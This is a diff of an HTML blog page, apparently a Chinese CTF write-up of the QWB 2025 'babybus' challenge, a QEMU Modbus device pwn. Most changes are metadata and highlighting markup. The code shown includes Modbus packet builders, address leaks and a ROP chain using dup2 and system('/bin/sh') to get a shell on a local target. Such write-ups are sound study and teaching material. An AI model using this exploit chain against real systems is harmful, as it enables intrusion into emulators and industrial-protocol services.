@@ -16,21 +16,22 @@
         document.documentElement.setAttribute('data-theme', 'light');
       }
     })();
-  </script><!-- Begin Jekyll SEO tag v2.8.0 -->
+  </script><!-- Begin Jekyll SEO tag v2.9.0 -->
 <title>强网杯线上赛 2025 babybus | Y²的博客</title>
-<meta name="generator" content="Jekyll v3.10.0" />
+<meta name="generator" content="Jekyll v4.4.1" />
 <meta property="og:title" content="强网杯线上赛 2025 babybus" />
 <meta name="author" content="Y² (aka.cameudis)" />
 <meta property="og:locale" content="en_US" />
 <meta name="description" content="题目简介" />
-<meta property="og:description" content="题目简介" />
+<meta name="twitter:description" property="og:description" content="题目简介" />
 <link rel="canonical" href="https://www.cameudis.com/2025/11/11/QWB-Qual-2025-babybus.html" />
 <meta property="og:url" content="https://www.cameudis.com/2025/11/11/QWB-Qual-2025-babybus.html" />
 <meta property="og:site_name" content="Y²的博客" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2025-11-11T00:00:00+08:00" />
+<meta property="article:modified_time" content="2025-11-11T00:00:00+08:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="强网杯线上赛 2025 babybus" />
+<meta name="twitter:title" content="强网杯线上赛 2025 babybus" />
 <script type="application/ld+json">
 {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Y² (aka.cameudis)"},"dateModified":"2025-11-11T00:00:00+08:00","datePublished":"2025-11-11T00:00:00+08:00","description":"题目简介","headline":"强网杯线上赛 2025 babybus","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cameudis.com/2025/11/11/QWB-Qual-2025-babybus.html"},"url":"https://www.cameudis.com/2025/11/11/QWB-Qual-2025-babybus.html"}</script>
 <!-- End Jekyll SEO tag -->
@@ -542,30 +543,30 @@
 
 <p>结合 modbus 网上的相关资料逆向，<code class="language-plaintext highlighter-rouge">resolve_modbus</code> 只是实现了 modbus 协议中最常见的两种操作——读和写。modbus 由于是工控协议，相对来说比较底层，因此存在 CRC 校验码字段。我们为了写脚本和设备交互，需要自己实现一下校验码计算，只需要将计算校验码的那个函数的伪代码复制给 AI 让它用 python 实现一下就可以了。下面就可以写出几个交互函数。</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">calc_crc</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">endian</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s">'little'</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">calc_crc</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">endian</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
     <span class="n">crc</span> <span class="o">=</span> <span class="mh">0xFFFF</span>
-    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
         <span class="n">crc</span> <span class="o">^=</span> <span class="n">b</span>
-        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
-            <span class="n">crc</span> <span class="o">=</span> <span class="p">((</span><span class="n">crc</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xA001</span><span class="p">)</span> <span class="k">if</span> <span class="p">(</span><span class="n">crc</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="k">else</span> <span class="p">(</span><span class="n">crc</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+            <span class="n">crc</span> <span class="o">=</span> <span class="p">((</span><span class="n">crc</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xA001</span><span class="p">)</span> <span class="nf">if </span><span class="p">(</span><span class="n">crc</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="nf">else </span><span class="p">(</span><span class="n">crc</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span>
             <span class="n">crc</span> <span class="o">&amp;=</span> <span class="mh">0xFFFF</span>
     <span class="k">return</span> <span class="n">crc</span>
 
-<span class="k">def</span> <span class="nf">crc_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">endian</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s">'little'</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
-    <span class="k">return</span> <span class="n">calc_crc</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">endian</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">crc_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">endian</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+    <span class="k">return</span> <span class="nf">calc_crc</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">endian</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">func03</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">quant</span><span class="p">):</span>
-    <span class="n">pak</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x01\x03</span><span class="s">'</span> <span class="o">+</span> <span class="n">addr</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">'big'</span><span class="p">)</span> <span class="o">+</span> <span class="n">quant</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">'big'</span><span class="p">)</span>
-    <span class="n">pak</span> <span class="o">+=</span> <span class="n">crc_bytes</span><span class="p">(</span><span class="n">pak</span><span class="p">)</span>
+    <span class="n">pak</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x01\x03</span><span class="sh">'</span> <span class="o">+</span> <span class="n">addr</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sh">'</span><span class="s">big</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">quant</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sh">'</span><span class="s">big</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">pak</span> <span class="o">+=</span> <span class="nf">crc_bytes</span><span class="p">(</span><span class="n">pak</span><span class="p">)</span>
     <span class="k">return</span> <span class="n">pak</span>
 
 <span class="k">def</span> <span class="nf">func10</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">quant</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
-    <span class="n">pak</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x01\x10</span><span class="s">'</span> <span class="o">+</span> <span class="n">addr</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">'big'</span><span class="p">)</span> <span class="o">+</span> <span class="n">quant</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">'big'</span><span class="p">)</span>
-    <span class="n">pak</span> <span class="o">+=</span> <span class="p">(</span><span class="n">quant</span><span class="o">*</span><span class="mi">2</span><span class="p">).</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">pak</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x01\x10</span><span class="sh">'</span> <span class="o">+</span> <span class="n">addr</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sh">'</span><span class="s">big</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">quant</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sh">'</span><span class="s">big</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">pak</span> <span class="o">+=</span> <span class="p">(</span><span class="n">quant</span><span class="o">*</span><span class="mi">2</span><span class="p">).</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
     <span class="n">pak</span> <span class="o">+=</span> <span class="n">data</span> <span class="c1"># for func03
 </span>    <span class="c1"># for i in range(quant):
 </span>        <span class="c1"># pak += data[i*2:i*2+2][::-1]
-</span>    <span class="n">pak</span> <span class="o">+=</span> <span class="n">crc_bytes</span><span class="p">(</span><span class="n">pak</span><span class="p">)</span>
+</span>    <span class="n">pak</span> <span class="o">+=</span> <span class="nf">crc_bytes</span><span class="p">(</span><span class="n">pak</span><span class="p">)</span>
     <span class="k">return</span> <span class="n">pak</span>
 </code></pre></div></div>
 
@@ -691,27 +692,27 @@
 
 <h3 id="泄漏地址">泄漏地址</h3>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">s</span><span class="p">(</span><span class="n">func03</span><span class="p">(</span><span class="mh">0xff9f</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">))</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nf">s</span><span class="p">(</span><span class="nf">func03</span><span class="p">(</span><span class="mh">0xff9f</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">))</span>
 
-    <span class="n">mes</span> <span class="o">=</span> <span class="n">r</span><span class="p">()</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="n">resolve_pak</span><span class="p">(</span><span class="n">mes</span><span class="p">)</span>
+    <span class="n">mes</span> <span class="o">=</span> <span class="nf">r</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="nf">resolve_pak</span><span class="p">(</span><span class="n">mes</span><span class="p">)</span>
 
-    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span><span class="o">-</span><span class="mh">0x203b60</span>
-    <span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] libc_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span><span class="o">-</span><span class="mh">0x203b60</span>
+    <span class="nf">success</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] libc_base: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 
-    <span class="n">prog_base</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mh">0xa8</span><span class="p">:</span><span class="mh">0xa8</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span><span class="o">-</span><span class="mh">0x9ea35e</span>
-    <span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] prog_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">prog_base</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">prog_base</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mh">0xa8</span><span class="p">:</span><span class="mh">0xa8</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span><span class="o">-</span><span class="mh">0x9ea35e</span>
+    <span class="nf">success</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] prog_base: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">prog_base</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 
-    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mh">0x10</span><span class="p">:</span><span class="mh">0x18</span><span class="p">])</span><span class="o">-</span><span class="mh">0xa4270</span>
-    <span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] heap_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">heap_base</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mh">0x10</span><span class="p">:</span><span class="mh">0x18</span><span class="p">])</span><span class="o">-</span><span class="mh">0xa4270</span>
+    <span class="nf">success</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] heap_base: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>使用 <code class="language-plaintext highlighter-rouge">pwndbg</code> 或 <code class="language-plaintext highlighter-rouge">gef</code> 提供的 <code class="language-plaintext highlighter-rouge">tele</code> 功能去 check 栈上的各种指针，找一个各类指针汇集之处来泄漏就行。</p>
 
 <h3 id="劫持控制流">劫持控制流</h3>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">s</span><span class="p">(</span><span class="n">func10</span><span class="p">(</span><span class="mh">0xfff1</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">char_backend</span><span class="p">)</span><span class="o">+</span><span class="n">flat</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="n">hijack_rip</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">hijack_rdi_rax</span><span class="p">])).</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)))</span>
-    <span class="n">s</span><span class="p">(</span><span class="n">func03</span><span class="p">(</span><span class="mh">0xfa17</span><span class="p">,</span> <span class="mh">0x5f4</span><span class="p">))</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nf">s</span><span class="p">(</span><span class="nf">func10</span><span class="p">(</span><span class="mh">0xfff1</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\0</span><span class="sh">'</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">char_backend</span><span class="p">)</span><span class="o">+</span><span class="nf">flat</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="n">hijack_rip</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">hijack_rdi_rax</span><span class="p">])).</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\0</span><span class="sh">'</span><span class="p">)))</span>
+    <span class="nf">s</span><span class="p">(</span><span class="nf">func03</span><span class="p">(</span><span class="mh">0xfa17</span><span class="p">,</span> <span class="mh">0x5f4</span><span class="p">))</span>
 </code></pre></div></div>
 
 <p>这里构造的大小、size 数据都需要手动计算（把约束条件都列出来，然后解不等式方程组），打了很多草稿，不重要就省略了。我首先使用 <code class="language-plaintext highlighter-rouge">func10</code> 将一些数据布置到栈上，包括：</p>
@@ -744,22 +745,22 @@
 </span>    <span class="c1"># 0x000000000010f78b : pop rdi ; ret
 </span>    <span class="c1"># 0x0000000000110a7d : pop rsi ; ret
 </span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">([</span>
         <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xdd237</span><span class="p">,</span>
         <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2d6c50</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">,</span>
         <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2882f</span><span class="p">,</span> <span class="c1"># ret
 </span>        <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x10f78b</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="c1"># pop rsi; 10
 </span>        <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x110a7d</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># pop rdi; 0
-</span>        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"dup2"</span><span class="p">],</span>
+</span>        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">dup2</span><span class="sh">"</span><span class="p">],</span>
         <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x10f78b</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="c1"># pop rsi; 10
 </span>        <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x110a7d</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="c1"># pop rdi; 1
-</span>        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"dup2"</span><span class="p">],</span>
+</span>        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">dup2</span><span class="sh">"</span><span class="p">],</span>
         <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x10f78b</span><span class="p">,</span> <span class="n">prog_base</span> <span class="o">+</span> <span class="mh">0xD8A7D7</span><span class="p">,</span> <span class="c1"># pop rdi; "/bin/sh"
 </span>        <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2882f</span><span class="p">,</span> <span class="c1"># ret (for rsp align)
-</span>        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
+</span>        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">]</span>
     <span class="p">])</span>
-    <span class="n">s</span><span class="p">(</span><span class="n">func10</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="o">*</span><span class="mh">0x11</span> <span class="o">+</span> <span class="n">payload</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x6c</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)))</span>
-    <span class="n">s</span><span class="p">(</span><span class="n">func03</span><span class="p">(</span><span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">))</span>
+    <span class="nf">s</span><span class="p">(</span><span class="nf">func10</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\0</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x11</span> <span class="o">+</span> <span class="n">payload</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x6c</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\0</span><span class="sh">'</span><span class="p">)))</span>
+    <span class="nf">s</span><span class="p">(</span><span class="nf">func03</span><span class="p">(</span><span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">))</span>
     
     <span class="n">hijack_rip</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x16bde0</span>
     <span class="n">hijack_rdi_rax</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2d6c50</span>
@@ -788,105 +789,105 @@
 #
 # Copyright © 2025 y2 &lt;cameudis@gmail.com&gt;
 </span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">]</span>
 
 <span class="c1"># ---------------- Environment Config ---------------- #
 </span>
-<span class="n">filename</span> <span class="o">=</span> <span class="s">"./qemu-system-x86_64"</span>
-<span class="n">libc_name</span> <span class="o">=</span> <span class="s">"./libc.so.6"</span>
-<span class="n">ip</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>
+<span class="n">filename</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./qemu-system-x86_64</span><span class="sh">"</span>
+<span class="n">libc_name</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./libc.so.6</span><span class="sh">"</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span>
 <span class="n">port</span> <span class="o">=</span> <span class="mi">1502</span>
 
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>
 
 <span class="c1"># context.log_level = 'debug'
 </span><span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">filename</span>
 
 <span class="c1"># ------------------- Exploitation ------------------- #
 </span>
-<span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
-<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span>      <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
-<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
-<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
-<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span>      <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 
-<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="n">socket</span>
 
-<span class="n">HOST</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>
+<span class="n">HOST</span> <span class="o">=</span> <span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span>
 <span class="n">PORT</span> <span class="o">=</span> <span class="mi">1502</span>
 
-<span class="k">def</span> <span class="nf">calc_crc</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">endian</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s">'little'</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+<span class="k">def</span> <span class="nf">calc_crc</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">endian</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
     <span class="n">crc</span> <span class="o">=</span> <span class="mh">0xFFFF</span>
-    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
         <span class="n">crc</span> <span class="o">^=</span> <span class="n">b</span>
-        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
-            <span class="n">crc</span> <span class="o">=</span> <span class="p">((</span><span class="n">crc</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xA001</span><span class="p">)</span> <span class="k">if</span> <span class="p">(</span><span class="n">crc</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="k">else</span> <span class="p">(</span><span class="n">crc</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+            <span class="n">crc</span> <span class="o">=</span> <span class="p">((</span><span class="n">crc</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xA001</span><span class="p">)</span> <span class="nf">if </span><span class="p">(</span><span class="n">crc</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="nf">else </span><span class="p">(</span><span class="n">crc</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span>
             <span class="n">crc</span> <span class="o">&amp;=</span> <span class="mh">0xFFFF</span>
     <span class="k">return</span> <span class="n">crc</span>
 
